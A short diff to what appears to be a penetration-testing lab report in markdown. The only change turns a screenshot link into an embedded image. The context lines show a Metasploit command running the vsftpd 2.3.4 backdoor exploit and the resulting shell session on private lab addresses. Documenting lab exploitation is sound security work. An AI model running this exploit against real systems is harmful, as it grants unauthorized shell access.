@@ -88,7 +88,9 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] Command shell session 1 opened (10.63.233.26:39963 → 10.63.233.95:6200) at 2026-02-17 15:51:06 +0530
 ```
 
-📸 **Screenshot:** [`evidence/screenshots/01_vsftpd_exploit_root_shell.png`](../evidence/screenshots/01_vsftpd_exploit_root_shell.png)
+📸 Screenshot:
+
+![vsftpd exploit root shell](../evidence/screenshots/01_vsftpd_exploit_root_shell.png)
 
 ---
 
